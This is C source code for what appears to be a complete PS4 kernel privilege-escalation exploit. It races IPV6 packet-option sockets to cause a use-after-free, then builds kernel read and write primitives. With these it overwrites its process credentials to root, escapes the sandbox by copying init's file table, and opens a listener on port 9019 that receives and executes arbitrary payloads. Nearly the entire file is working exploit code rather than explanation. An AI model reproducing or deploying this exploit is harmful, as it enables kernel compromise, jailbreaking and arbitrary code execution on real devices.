#include <sys/types.h>
#define _KERNEL
#include <sys/event.h>
//#include <sys/proc.h>
//#include <sys/filedesc.h>
__BEGIN_DECLS // haven't been included because of _KERNEL
int     kqueue(void);
int     kevent(int kq, const struct kevent *changelist, int nchanges,
	    struct kevent *eventlist, int nevents,
	    const struct timespec *timeout);
__END_DECLS
#undef _KERNEL
#include <errno.h>
#ifdef __PS4__
#include <printf/printf.h>
#include <ps4/errno.h>
#else
#include <stdio.h>
#endif
#define _WANT_UCRED
#include <sys/ucred.h>
#include <sys/mman.h>
#include <ps4/saveall.h>
#include <ps4/exit.h>
#include <librop/pthread_create.h>
#include <librop/extcall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet6/ip6_var.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <signal.h>
#include <fcntl.h>

static void do_die(int line)
{
    printf("die %d\n", line);
    exit(2);
}

#define die() do_die(__LINE__)

int all_sockets[512];
int total_sockets = 0;

#define new_socket() (all_sockets[total_sockets++] = socket(AF_INET6, SOCK_DGRAM, 0))

#define IPV6_2292PKTINFO 19
#define IPV6_2292PKTOPTIONS 25

// ps4-rop-8cc generates thread-unsafe code, so each racing thread needs its own get_tclass function
#define GET_TCLASS(name) int name(int s)\
{\
    int v;\
    socklen_t l = sizeof(v);\
    if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l))\
        die();\
    return v;\
}

GET_TCLASS(get_tclass)
GET_TCLASS(get_tclass_2)
GET_TCLASS(get_tclass_3)

int set_tclass(int s, int val)
{
    if(setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
    {
        printf("set_tclass failed on socket %d value 0x%x\n", s, val);
        die();
    }
}

#define TCLASS_MASTER 0x13370000
#define TCLASS_MASTER_2 0x73310000
#define TCLASS_SPRAY 0x41
#define TCLASS_TAINT 0x42

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s) set_pktopts(s, NULL, 0)

int get_rthdr(int s, char* buf, int len)
{
    socklen_t l = len;
    if(getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
        die();
    return l;
}

#define set_pktinfo(s, buf) setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))

int get_pktinfo(int s, char* buf)
{
    socklen_t l = sizeof(struct in6_pktinfo);
    if(getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
        die();
    return l;
}

struct opaque
{
    volatile int triggered;
    volatile int padding;
    volatile int done1;
    volatile int done2;
    int master_sock;
    int kevent_sock;
    int* spray_sock;
    int* kq;
};

void* use_thread(void* arg)
{
    struct opaque* o = (struct opaque*)arg;
    char buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr* cmsg = (struct cmsghdr*)buf;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    cmsg->cmsg_level = IPPROTO_IPV6;
    cmsg->cmsg_type = IPV6_TCLASS;
    *(int*)CMSG_DATA(cmsg) = 0;
    while(!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
        if(set_pktopts(o->master_sock, buf, sizeof(buf)))
            die();
    o->triggered = 1;
    o->done1 = 1;
}

void* free_thread(void* arg)
{
    struct opaque* o = (struct opaque*)arg;
    while(!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY)
    {
        if(free_pktopts(o->master_sock))
            die();
        nanosleep(&(struct timespec){0, 1000000}, NULL); // 1 ms
    }
    o->triggered = 1;
    o->done2 = 1;
}

void trigger_uaf(struct opaque* o)
{
    o->triggered = o->padding = o->done1 = o->done2 = 0;
    int qqq[256];
    pthread_create((void*)qqq, NULL, use_thread, o);
    pthread_create((void*)(qqq+128), NULL, free_thread, o);
    while(!o->triggered)
    {
        for(int i = 0; i < 32; i++)
            set_tclass(o->spray_sock[i], TCLASS_SPRAY);
        if(get_tclass(o->master_sock) == TCLASS_SPRAY)
            break;
        for(int i = 0; i < 32; i++)
            if(free_pktopts(o->spray_sock[i]))
                die();
        nanosleep(&(struct timespec){0, 1000000}, NULL); // 1 ms
    }
    printf("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
    o->triggered = 1;
    while(!o->done1 || !o->done2);
}

int build_rthdr_msg(char* buf, int size)
{
    int len = ((size / 8) - 1) & ~1;
    size = (len + 1) * 8;
    struct ip6_rthdr* rthdr = (struct ip6_rthdr*)buf;
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
    return size;
}

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))

int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo)
{
    free_pktopts(overlap_sock);
    char buf[0x100] = {0};
    int l = build_rthdr_msg(buf, 0x100);
    int tclass;
    for(;;)
    {
        for(int i = 0; i < 128; i++)
        {
            *(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
            *(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
            if(set_rthdr(o->spray_sock[i], buf, l))
                die();
        }
        tclass = get_tclass(o->master_sock);
        if((tclass & 0xffff0000) == tclass0)
            break;
        for(int i = 0; i < 128; i++)
            if(set_rthdr(o->spray_sock[i], NULL, 0))
                die();
    }
    return tclass & 0xffff;
}

unsigned long long leak_kmalloc(int master_sock, int overlap_sock, char* buf, int sz)
{
    int l = build_rthdr_msg(buf, sz);
    if(set_rthdr(master_sock, buf, l))
        die();
    char buf2[256];
    get_rthdr(overlap_sock, buf2, 256);
    return *(unsigned long long*)(buf2 + PKTOPTS_RTHDR_OFFSET);
}

void leak_kevent_pktopts(struct opaque* o, int overlap_sock, unsigned long long* ptrs)
{
    char buf[0x800];
#if 0
    struct kevent kv;
    EV_SET(&kv, o->kevent_sock, EVFILT_READ, EV_ADD, 0, 5, NULL);
    ptrs[0] = leak_kmalloc(o->master_sock, overlap_sock, buf, 0x800);
    if(set_rthdr(o->master_sock, NULL, 0))
        die();
    for(int i = 0; i < 256; i++)
        kevent(o->kq[i], &kv, 1, 0, 0, 0);
    printf("kevent_addr = 0x%llx\n", ptrs[0]);
    for(int i = 0; i < 400; i++)
        free_pktopts(o->spray_sock[i]);
#endif
    ptrs[1] = leak_kmalloc(o->master_sock, overlap_sock, buf, 0x100);
    if(set_rthdr(o->master_sock, NULL, 0))
        die();
    for(int i = 0; i < 400; i++)
    {
        free_pktopts(o->spray_sock[i]);
        set_tclass(o->spray_sock[i], 123);
    }
    printf("pktopts_addr = 0x%llx\n", ptrs[1]);
}

void write_to_victim(struct opaque* o, unsigned long long addr)
{
    char buf[sizeof(struct in6_pktinfo)];
    get_pktinfo(o->master_sock, buf);
    *(unsigned long long*)buf = addr;
    *(unsigned long long*)(buf+8) = 0;
    *(unsigned int*)(buf+16) = 0;
    if(set_pktinfo(o->master_sock, buf))
        die();
}

int find_victim_sock(struct opaque* o, unsigned long long pktopts_addr)
{
    char buf[sizeof(struct in6_pktinfo)];
    for(int i = 0; i < 400; i++)
        set_pktinfo(o->spray_sock[i], 0);
    write_to_victim(o, pktopts_addr + PKTOPTS_PKTINFO_OFFSET - 1);
    for(int i = 0; i < 400; i++)
    {
        *(unsigned long long*)buf = 0;
        get_pktinfo(o->spray_sock[i], buf);
        if(*(unsigned long long*)buf == pktopts_addr + PKTOPTS_PKTINFO_OFFSET - 1)
            printf("found another overlap of master_sock: %d\n", i);
        else if(*(unsigned long long*)(buf+1) == pktopts_addr + PKTOPTS_PKTINFO_OFFSET - 1)
            return i;
    }
    return -1;
}

unsigned long long kread64(struct opaque* o, int victim_sock, unsigned long long k)
{
    char buf[sizeof(struct in6_pktinfo)];
    write_to_victim(o, k);
    get_pktinfo(victim_sock, buf);
    uint64_t ans = *(unsigned long long*)buf;
    return ans;
}

void kwrite64(struct opaque* o, int victim_sock, unsigned long long k, unsigned long long v)
{
    char buf[sizeof(struct in6_pktinfo)];
    write_to_victim(o, k);
    get_pktinfo(victim_sock, buf);
    *(unsigned long long*)buf = v;
    write_to_victim(o, k);
    if(set_pktinfo(victim_sock, buf))
        die();
}

void kwrite20(struct opaque* o, int victim_sock, uint64_t addr, uint64_t a, uint64_t b, uint32_t c)
{
    char buf[20];
    *(uint64_t*)buf = a;
    *(uint64_t*)(buf+8) = b;
    *(uint32_t*)(buf+16) = c;
    write_to_victim(o, addr);
    if(set_pktinfo(victim_sock, buf))
        die();
}

uint64_t kmalloc(struct opaque* o, int victim, uint64_t ptr, size_t sz)
{
    char buf[0x200] = {0};
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET, 0, 1, 0);
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET + 8, 0, 1, 0);
    set_rthdr(victim, buf, build_rthdr_msg(buf, 0x200));
    uint64_t ans = kread64(o, victim, ptr + PKTOPTS_RTHDR_OFFSET);
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET, 0, 1, 0);
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET + 8, 0, 1, 0);
    return ans;
}

void kfree(struct opaque* o, int victim, uint64_t ptr, uint64_t obj)
{
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET, obj, 1, 0);
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET + 8, 0, 1, 0);
    set_rthdr(victim, NULL, 0);
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET, 0, 1, 0);
    kwrite20(o, victim, ptr + PKTOPTS_RTHDR_OFFSET + 8, 0, 1, 0);
}

uint64_t leak_kqueue(struct opaque* o, int victim, uint64_t ptr)
{
    uint64_t* ptrs = NULL;
    for(;;)
    {
        uint64_t* ptrs2 = mmap(0, 65536, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        ptrs2[0] = (uint64_t)ptrs;
        int fd;
        for(int i = 1; i < 8192; i++)
        {
            if(i == 4096)
                fd = kqueue();
            uint64_t p = kmalloc(o, victim, ptr, 0x200);
            ptrs2[i] = p;
        }
        ptrs = ptrs2;
        for(uint64_t* q = ptrs; q; q = (uint64_t*)q[0])
            for(int i = 1; i < 8192; i++)
            {
                uint64_t kq = q[i] ^ 0x200;
                uint64_t p = kread64(o, victim, kq);
                if((p >> 32) == (uint32_t)-1 && (p & 0xfff) == 0xad3 && kread64(o, victim, p-1) == __builtin_gadget_addr("db (chr(0)+'kqueue'+chr(0)).encode('ascii')"))
                {
                    while(ptrs)
                    {
                        for(int i = 1; i < 8192; i++)
                            kfree(o, victim, ptr, ptrs[i]);
                        ptrs2 = (uint64_t*)ptrs[0];
                        munmap(ptrs, 65536);
                        ptrs = ptrs2;
                    }
                    return p;
                }
            }
        close(fd);
    }
}

unsigned long long __builtin_gadget_addr(const char*);

void set_pipe_read(struct opaque* o, int victim, uint64_t rpipe, uint64_t addr)
{
    kwrite20(o, victim, rpipe, __builtin_gadget_addr("dq 0x4000000040000000"), __builtin_gadget_addr("dq 0x4000000000000000"), 0);
    kwrite20(o, victim, rpipe+16, addr, 0, 0);
}

void set_pipe_write(struct opaque* o, int victim, uint64_t rpipe, uint64_t addr)
{
    kwrite20(o, victim, rpipe, 0, __builtin_gadget_addr("dq 0x4000000000000000"), 0);
    kwrite20(o, victim, rpipe+16, addr, 0, 0);
}

int jitshm_create(int flags, unsigned long long size, int prot);
int jitshm_alias(int fd, int prot);
int dynlib_dlsym(int handle, const char* name, void** ptr);

static void my_memcpy(char* dst, const char* src, size_t sz)
{
    while(sz >= 8)
    {
        *(uint64_t*)dst = *(uint64_t*)src;
        dst += 8;
        src += 8;
        sz -= 8;
    }
    while(sz)
    {
        *dst++ = *src++;
        sz--;
    }
}

static void my_rmemcpy(char* dst, const char* src, size_t sz)
{
    dst += sz;
    src += sz;
    while(sz >= 8)
    {
        dst -= 8;
        src -= 8;
        sz -= 8;
        *(uint64_t*)dst = *(uint64_t*)src;
    }
    while(sz)
    {
        *--dst = *--src;
        sz--;
    }
}

static void my_memzero(char* dst, size_t sz)
{
    while(sz >= 8)
    {
        *(uint64_t*)dst = 0;
        dst += 8;
        sz -= 8;
    }
    while(sz)
    {
        *dst++ = 0;
        sz--;
    }
}

void load_payload(uint64_t* args)
{
    void* payload_addr = (void*)__builtin_gadget_addr("$ window.payload ? read_ptr_at(addrof(window.payload)+16) : 0");
    size_t payload_len = __builtin_gadget_addr("$ window.payload ? window.payload.length : 0");
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_addr = {.s_addr = 0},
        .sin_port = 0x3b23, //9019
    };
    if(!payload_addr)
    {
        if(bind(sock, (void*)&sin, sizeof(sin)) || listen(sock, 1))
            die();
        void* sceKernelSendNotificationRequest = 0;
        dynlib_dlsym(0x2001, "sceKernelSendNotificationRequest", &sceKernelSendNotificationRequest);
        printf("sceKernelSendNotificationRequest = 0x%llx\n", sceKernelSendNotificationRequest);
        struct {
            char pad1[0x10];
            int f1;
            char pad2[0x19];
            char msg[0xc03];
        } notification = { .f1 = -1, .msg = "waiting for payloads" };
        rop_call_funcptr(sceKernelSendNotificationRequest, 0, &notification, 0xc30, 0);
        printf("waiting for payload\n");
    }
    for(;;)
    {
        char* mem;
        size_t cap;
        size_t sz;
        if(payload_addr)
        {
            cap = ((payload_len-1)|16383)+1;
            mem = mmap(0, cap, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
            sz = payload_len;
            my_memcpy(mem, payload_addr, payload_len);
        }
        else
        {
            int sock2 = accept(sock, NULL, NULL);
            printf("sock2 = %d\n", sock2);
            mem = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
            cap = 16384;
            sz = 0;
            for(;;)
            {
                printf("sz = %zu, cap = %zu\n", sz, cap);
                ssize_t chk = read(sock2, mem+sz, cap-sz);
                printf("chk = %zd\n", chk);
                if(chk <= 0)
                    break;
                sz += chk;
                if(sz == cap)
                {
                    printf("moving data... ");
                    size_t cap2 = cap * 2;
                    char* mem2 = mmap(0, cap2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
                    my_memcpy(mem2, mem, sz);
                    munmap(mem, cap);
                    mem = mem2;
                    cap = cap2;
                    printf("done\n");
                }
            }
            close(sock2);
        }
        printf("payload received, mem = 0x%llx, size = %zu\n", mem, sz);
        if(sz < 13 || (uint8_t)mem[0] != 0xeb || (uint8_t)mem[1] != 11 || (uint8_t)mem[2] != 'P' || (uint8_t)mem[3] != 'L' || (uint8_t)mem[4] != 'D')
        {
            printf("invalid payload: %d %d %d %d %d %d\n", sz < 13, (uint8_t)mem[0] != 0xeb, (uint8_t)mem[1] != 11, (uint8_t)mem[2] != 'P', (uint8_t)mem[3] != 'L', (uint8_t)mem[4] != 'D');
            munmap(mem, sz);
            continue;
        }
        uint64_t text_size = *(uint64_t*)(mem+5);
        if(text_size > sz)
        {
            printf("text size > payload size\n");
            munmap(mem, sz);
            continue;
        }
        uint64_t aligned_text_size = ((text_size - 1) | 16383) + 1;
        uint64_t misalignment = aligned_text_size - text_size;
        printf("text_size = 0x%llx, aligned_text_size = 0x%llx, misalignment = 0x%llx\n", text_size, aligned_text_size, misalignment);
        size_t total_size = sz + misalignment;
        if(total_size > cap)
        {
            printf("moving data... ");
            char* mem2 = mmap(0, total_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
            my_memcpy(mem2, mem, sz);
            munmap(mem, cap);
            mem = mem2;
            cap = total_size;
            printf("done\n");
        }
        my_rmemcpy(mem + misalignment, mem, sz);
        my_memzero(mem, misalignment);
        printf("payload_addr = 0x%llx\n", mem);
        int jit1 = jitshm_create(0, aligned_text_size, PROT_READ|PROT_WRITE|PROT_EXEC);
        int jit2 = jitshm_alias(jit1, PROT_READ|PROT_WRITE);
        printf("jit: %d %d\n", jit1, jit2);
        char* jit_shadow = mmap(0, aligned_text_size, PROT_READ|PROT_WRITE, MAP_SHARED, jit2, 0);
        printf("jit_shadow = 0x%llx\n", jit_shadow);
        my_memcpy(jit_shadow, mem, aligned_text_size);
        char* jit_mapping = mmap(mem, aligned_text_size, PROT_READ|PROT_EXEC, MAP_FIXED|MAP_SHARED, jit1, 0);
        printf("jit_mapping = 0x%llx\n", jit_mapping);
        if(jit_mapping != mem)
            die();
        printf("calling payload\n");
        rop_call_funcptr((void(*)(void))(mem+misalignment), args[0], args[1], args[2], args[3], args[4], args[5]);
        printf("payload returned\n");
        if(payload_addr)
            return;
    }
}

extern int ps4_printf_fd;

void setup_ufo(void)
{
    ps4_printf_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_addr = {.s_addr = 0x13371337},
        .sin_port = 0xd204,
    };
    connect(ps4_printf_fd, (void*)&sin, sizeof(sin));
}

int main()
{
    //setup_ufo();
    if(!setuid(0))
        return 179;
    for(int i = 0; i < 16; i++)
        new_socket();
    int master_sock = new_socket();
    int spray_sock[400];
    int q1 = 0, q2 = 0;
    for(int i = 0; i < 400; i++)
        q1 += (spray_sock[i] = new_socket());
    printf("sockets=%d kqueues=%d\n", q1, q2);
    struct opaque o = {.master_sock = master_sock, .spray_sock = spray_sock};
    trigger_uaf(&o);
    printf("uaf ok!\n");
    set_tclass(master_sock, TCLASS_TAINT);
    int overlap_idx = -1;
    for(int i = 0; i < 400; i++)
        if(get_tclass(spray_sock[i]) == TCLASS_TAINT)
            overlap_idx = i;
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    int overlap_sock = spray_sock[overlap_idx];
    int cleanup1 = overlap_sock;
    spray_sock[overlap_idx] = new_socket();
    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, 0);
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    overlap_sock = spray_sock[overlap_idx];
    int cleanup2 = overlap_sock;
    spray_sock[overlap_idx] = new_socket();
    unsigned long long ptrs[2];
    int victim = -1;
    leak_kevent_pktopts(&o, overlap_sock, ptrs);
    set_rthdr(overlap_sock, NULL, 0); // clean up from the previous spray
    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER_2, ptrs[1] + PKTOPTS_PKTINFO_OFFSET);
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    victim = find_victim_sock(&o, ptrs[1]);
    printf("victim_idx = %d\n", victim);
    if(victim < 0)
        return 1;
    overlap_sock = spray_sock[overlap_idx];
    spray_sock[overlap_idx] = new_socket();
    victim = spray_sock[victim];
    for(int i = 0; i < 1024; i++)
        kmalloc(&o, victim, ptrs[1], 0x100);
    uint64_t kqueue = leak_kqueue(&o, victim, ptrs[1]);
    uint64_t kdata_base = kqueue - 0x318ad3;
    printf("kdata_base = 0x%llx\n", kdata_base);
    uint64_t curproc = -1;
    uint64_t pid1 = -1;
    int own_pid = getpid();
    for(uint64_t proc = kread64(&o, victim, kdata_base+0x27edcb8); proc; proc = kread64(&o, victim, proc))
    {
        int pid = (uint32_t)kread64(&o, victim, proc+0xbc);
        if(pid == own_pid)
            curproc = proc;
        else if(pid == 1)
            pid1 = proc;
    }
    uint64_t pid1_ucred = kread64(&o, victim, pid1+0x40);
    uint64_t pid1_fd = kread64(&o, victim, pid1+0x48);
    uint64_t p_ucred = kread64(&o, victim, curproc+0x40);
    uint64_t p_fd = kread64(&o, victim, curproc+0x48);
    uint64_t p_ofiles = kread64(&o, victim, p_fd);
    int the_pipe[2];
    if(pipe(the_pipe))
        die();
    all_sockets[total_sockets++] = the_pipe[0];
    all_sockets[total_sockets++] = the_pipe[1];
    uint64_t pipe_file = kread64(&o, victim, p_ofiles+8+48*the_pipe[0]);
    uint64_t rpipe = kread64(&o, victim, pipe_file);
    printf("pipe = (%d, %d), rpipe = 0x%llx\n", the_pipe[0], the_pipe[1], rpipe);
    struct ucred the_ucred;
    set_pipe_read(&o, victim, rpipe, p_ucred);
    if(read(the_pipe[0], &the_ucred, 0x70) != 0x70)
        die();
    the_ucred.cr_uid = 0;
    the_ucred.cr_ruid = 0;
    the_ucred.cr_svuid = 0;
    the_ucred.cr_rgid = 0;
    the_ucred.cr_svgid = 0;
    uint64_t* sony_cred = (uint64_t*)((char*)&the_ucred + 0x58);
    sony_cred[0] = __builtin_gadget_addr("dq 0x4801000000000013");
    sony_cred[1] = -1;
    sony_cred[2] = -1;
    set_pipe_write(&o, victim, rpipe, p_ucred);
    if(write(the_pipe[1], &the_ucred, 0x70) != 0x70)
        die();
    set_pipe_write(&o, victim, rpipe, p_ucred+0x83);
    if(write(the_pipe[1], "\x80", 1) != 1)
        die();
    uint64_t fd_ptrs[3];
    set_pipe_read(&o, victim, rpipe, pid1_fd+8);
    if(read(the_pipe[0], fd_ptrs, 24) != 24)
        die();
    set_pipe_write(&o, victim, rpipe, p_fd+8);
    if(write(the_pipe[1], fd_ptrs, 24) != 24)
        die();
    uint64_t p_dynlib = kread64(&o, victim, curproc+0x3e8);
    set_pipe_write(&o, victim, rpipe, p_dynlib + 0x118);
    if(write(the_pipe[1], "\0\0\0\0", 4) != 4)
        die();
    set_pipe_write(&o, victim, rpipe, p_dynlib + 0x18);
    if(write(the_pipe[1], "\1\0\0\0\0\0\0\0", 8) != 8)
        die();
    printf("getuid() = %d\n", getuid());
    printf("fixing up sockets\n");
    nanosleep(&(struct timespec){5, 0}, 0);
    for(int i = 0; i < total_sockets; i++)
    {
        uint64_t sock_file = kread64(&o, victim, p_ofiles+8+48*all_sockets[i]);
        kwrite20(&o, victim, sock_file+0x28, 999, 0, 0);
    }
    void* sceKernelDlsym = 0;
    dynlib_dlsym(0x2001, "sceKernelDlsym", &sceKernelDlsym);
    printf("sceKernelDlsym = 0x%llx\n", sceKernelDlsym);
    uint64_t payload_args[6] = {(uint64_t)sceKernelDlsym, master_sock, victim, ptrs[1], kdata_base};
    load_payload(payload_args);
    return 0;
}
